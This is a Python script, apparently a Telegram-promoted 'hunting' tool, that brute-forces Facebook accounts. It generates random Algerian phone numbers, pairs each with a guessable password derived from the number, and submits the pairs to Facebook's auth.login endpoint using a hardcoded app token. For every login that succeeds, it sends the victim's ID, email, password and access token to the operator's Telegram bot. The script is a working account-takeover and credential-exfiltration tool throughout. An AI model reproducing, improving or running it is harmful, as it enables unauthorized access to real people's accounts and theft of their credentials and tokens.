##السورس تاع ويسبر
import requests, sys, time, os, random, pyfiglet, colorama
from time import sleep
import webbrowser
webbrowser.open('https://t.me/tuiuuy')
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;32m'
os.system('clear')
print(str(pyfiglet.figlet_format('WEZZA🦆🔥🔥')) + f"{S}WEZZA🦆🔥🔥 </>\\---------------------------------------------------")
print(f"By {colorama.Fore.CYAN}WEZZA🦆🔥🔥 {colorama.Fore.RESET}")
ID = input('[•]ENTER ID : ')
tok = input('[•] ENTER TOKEN BOT : ')
print(f"{S}-------------------- HUNT HUNT🦆🔥🔥---------------------------")
user = '1234567890'

def code_whisper(email, password):
    url = 'https://api.facebook.com/method/auth.login'
    headers = {'user-agent':'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10', 
     'Accept-Language':'en-US,en;q=0.5'}
    data = {'email':email, 
     'password':password,  'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',  'locale':'en_DZ',  'format':'JSON'}
    req = requests.post(url, headers=headers, data=data)
    id = str(req.json()['uid'])
    con = str(req.json()['identifier'])
    tkn = str(req.json()['access_token'])
    tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.🦆🔥🔥. Hacked FaceBook From WEZZA.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.🦆🔥🔥. ID ==> {id}\n.✉. E-mail ==> {email} \n.🦆🔥🔥. PassWord ==> {password}\n.📨. Confirmed E-mail ==> {con}\n.📃. Access Token ==> {tkn} \n ︎.ꨄ︎------------------------------------------------- ꨄ︎. \n..تلغرام ==> @tuiuuy"
    i = requests.post(tlg)
    print(f"{G}.💀. HUNT IN INDIA  ..\n ︎.ꨄ︎ --------------------------- ꨄ︎. \n.. ID ==> {id}\n.. E-mail ==> {email} \n.🦆🔥🔥. PassWord ==> {password}\n.📨. Confirmed E-mail ==> {con}\n.🦆🔥🔥. Access Token ==> {tkn} \n ︎.ꨄ︎ ::::::::::::::::::::::::::::::::::: ꨄ︎. \n.. Tele ==> @tuiuuy")


while True:
    whisper = str(''.join((random.choice(user) for i in range(9))))
    email = '+213' + whisper
    password = '0' + whisper
    if email == '':
        exit()
    if password == '':
        exit()
    url = 'https://api.facebook.com/method/auth.login'
    headers = {'user-agent':'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10', 
     'Accept-Language':'en-US,en;q=0.5'}
    data = {'email':email, 
     'password':password,  'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',  'locale':'en_DZ',  'format':'JSON'}
    req = requests.post(url, headers=headers, data=data)
    if 'access_token' in req.json():
        code_whisper(email, password)
    if '(405)' in req.json()['error_msg']:
        print(f"{S}CheckPoint {email}:{password}")
    else:
        print(f"{E}E-mail ==> {email} | PassWord ==> {password}")
   
